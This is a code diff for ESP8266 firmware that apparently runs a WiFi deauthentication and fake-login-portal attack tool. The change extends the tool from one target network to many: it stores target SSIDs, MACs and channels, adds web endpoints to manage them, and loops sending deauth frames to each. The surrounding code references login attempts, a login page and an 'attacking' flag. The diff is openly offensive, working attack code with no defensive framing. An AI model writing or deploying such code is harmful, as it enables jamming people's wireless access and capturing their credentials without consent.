@@ -27,42 +27,128 @@ Config config;
 
 ESP8266WebServer server(80);
 
+
+struct MultipleTarget {
+  String ssid;
+  String mac;
+  int channel;
+};
+
+std::vector<MultipleTarget> targets;  // Global vector to store multiple targets  
+
 uint8_t targetMAC[6];
 int attackCount = 0;          // Global counter
 
 // HTML Template with {{ssid}} placeholder
+// ===== Save Targets =====
+void saveTargets() {
+  File file = LittleFS.open("/targets.json", "w");
+  if (!file) return;
 
+  StaticJsonDocument<1024> doc;
+  JsonArray arr = doc.createNestedArray("targets");
 
+  for (auto &t : targets) {
+    JsonObject obj = arr.createNestedObject();
+    obj["ssid"] = t.ssid;
+    obj["mac"] = t.mac;
+    obj["channel"] = t.channel;
+  }
+
+  serializeJson(doc, file);
+  file.close();
+}
+
+// ===== Load Targets =====
+void loadTargets() {
+  if (!LittleFS.exists("/targets.json")) return;
+  File file = LittleFS.open("/targets.json", "r");
+
+  StaticJsonDocument<1024> doc;
+  if (deserializeJson(doc, file)) return;
+  file.close();
+
+  targets.clear();
+  for (JsonObject t : doc["targets"].as<JsonArray>()) {
+    MultipleTarget target;
+    target.ssid = t["ssid"].as<String>();
+    target.mac = t["mac"].as<String>();
+    target.channel = t["channel"].as<int>();
+    targets.push_back(target);
+  }
+
+}
+
+// ===== API: Save Targets =====
+void handleSaveTargets() {
+  if (!server.hasArg("plain")) {
+    server.send(400, "application/json", "{\"success\":false}");
+    return;
+  }
+
+  StaticJsonDocument<1024> doc;
+  deserializeJson(doc, server.arg("plain"));
+  targets.clear();
+
+  for (JsonObject t : doc["targets"].as<JsonArray>()) {
+    MultipleTarget target;
+    target.ssid = t["ssid"].as<String>();
+    target.mac = t["mac"].as<String>();
+    target.channel = t["channel"].as<int>();
+    targets.push_back(target);
+  }
+
+  saveTargets();
+  server.send(200, "application/json", "{\"success\":true}");
+}
+
+// ===== API: Load Targets =====
+void handleLoadTargets() {
+  StaticJsonDocument<1024> doc;
+  JsonArray arr = doc.createNestedArray("targets");
+
+  for (auto &t : targets) {
+    JsonObject obj = arr.createNestedObject();
+    obj["ssid"] = t.ssid;
+    obj["mac"] = t.mac;
+    obj["channel"] = t.channel;
+  }
+
+  doc["success"] = true;
+  String response;
+  serializeJson(doc, response);
+  server.send(200, "application/json", response);
+}
 
   void saveConfig() {
-  File file = LittleFS.open("/config.json", "w");
-  if (!file) {
-    Serial.println("Failed to open config file for writing");
-    return;
-  }
+    File file = LittleFS.open("/config.json", "w");
+    if (!file) {
+      Serial.println("Failed to open config file for writing");
+      return;
+    }
 
-  StaticJsonDocument<1024> doc; // Increased from 512 to 1024
-  doc["ip"] = config.ip;
-  doc["targetSSID"] = config.targetSSID;
-  doc["targetMAC"] = config.targetMAC;
-  doc["loginPageName"] = config.loginPageName;
-  doc["targetChannel"] = config.targetChannel;
-  doc["username"] = config.username;
-  doc["password"] = config.password;
-  doc["attacking"] = config.attacking;
-  doc["scanningForChannel"] = config.scanningForChannel;
-  doc["totalSendPkt"] = config.totalSendPkt;
-  doc["pkts"] = config.pkts;
-  if (serializeJson(doc, file) == 0) {
-    Serial.println("Failed to write to file");
+    StaticJsonDocument<1024> doc; // Increased from 512 to 1024
+    doc["ip"] = config.ip;
+    doc["targetSSID"] = config.targetSSID;
+    doc["targetMAC"] = config.targetMAC;
+    doc["loginPageName"] = config.loginPageName;
+    doc["targetChannel"] = config.targetChannel;
+    doc["username"] = config.username;
+    doc["password"] = config.password;
+    doc["attacking"] = config.attacking;
+    doc["scanningForChannel"] = config.scanningForChannel;
+    doc["totalSendPkt"] = config.totalSendPkt;
+    doc["pkts"] = config.pkts;
+    if (serializeJson(doc, file) == 0) {
+      Serial.println("Failed to write to file");
+      file.close();
+      return;
+    }
     file.close();
-    return;
-  }
-  file.close();
-  Serial.println("Config saved successfully");
-  delay(2000);
-  Serial.println("Rebooting...");
-  ESP.restart();
+    Serial.println("Config saved successfully");
+    delay(2000);
+    Serial.println("Rebooting...");
+    ESP.restart();
 }
 
 void loadConfig() {
@@ -124,13 +210,15 @@ void printConfig() {
   Serial.println("Attacking: " + String(config.attacking ? "true" : "false"));
   Serial.println("Scanning For Channel: " + String(config.scanningForChannel ? "true" : "false"));
   Serial.println("=======================");
+  Serial.println("===== MULTIPLE TARGETS =====");
+  for (auto &t : targets) {
+    Serial.println("SSID: " + t.ssid);
+    Serial.println("MAC: " + t.mac);
+    Serial.println("Channel: " + String(t.channel));
+  }
+  Serial.println("=======================");
 }
 
-void macStrToBytes(const char* macStr, uint8_t* mac) {
-  for (int i = 0; i < 6; i++) {
-    sscanf(macStr + 3 * i, "%2hhx", &mac[i]);
-  }
-}
 
 bool parseMAC(const String& macStr, uint8_t* mac) {
   if (macStr.length() != 17) return false;
@@ -355,6 +443,7 @@ void clearLoginAttempts() {
 }
 
 
+
 void setup() {
   Serial.begin(115200);
 
@@ -363,6 +452,7 @@ void setup() {
     return;
   }
   loadConfig();
+  loadTargets();
 
   WiFi.mode(WIFI_AP_STA);
 
@@ -385,7 +475,6 @@ void setup() {
 
   printConfig();
 
-  macStrToBytes(config.targetMAC.c_str(), targetMAC);
 
   // Setup web server
   server.on("/", HTTP_GET, []() {
@@ -496,9 +585,17 @@ void setup() {
   server.on("/login_attempts", HTTP_GET, showLoginAttempts);
   server.on("/clear_login_attempts", HTTP_POST, clearLoginAttempts);
 
+  server.on("/save_targets", HTTP_POST, handleSaveTargets);
+  server.on("/load_targets", HTTP_GET, handleLoadTargets);
+
   server.begin(); // Start the web server
   Serial.println("Web server started");
 
+}
+void macStrToBytesMultiple(const String &macStr, uint8_t *macBytes) {
+  for (int i = 0; i < 6; i++) {
+    macBytes[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+  }
 }
 
 
@@ -509,11 +606,24 @@ void loop() {
 
 
   if (config.scanningForChannel) {
-    findChannelByMAC(targetMAC);
+    uint8_t mac[6]; 
+    macStrToBytesMultiple(config.targetMAC, mac);
+    findChannelByMAC(mac);
   }
 
   if (config.attacking && attackCount < config.totalSendPkt) {
-    sendDeauth(targetMAC, config.targetChannel);
+    for (auto &t : targets) {
+      uint8_t mac[6];
+      macStrToBytesMultiple(t.mac, mac);
+      Serial.println("Sending deauth to: " + t.mac);
+      sendDeauth(mac, t.channel);
+      delay(100);
+      
+    }
+    uint8_t mac[6]; 
+    macStrToBytesMultiple(config.targetMAC, mac);
+    sendDeauth(mac, config.targetChannel);
+
     attackCount++;
     Serial.println("Deauth sent: " + String(attackCount));
 
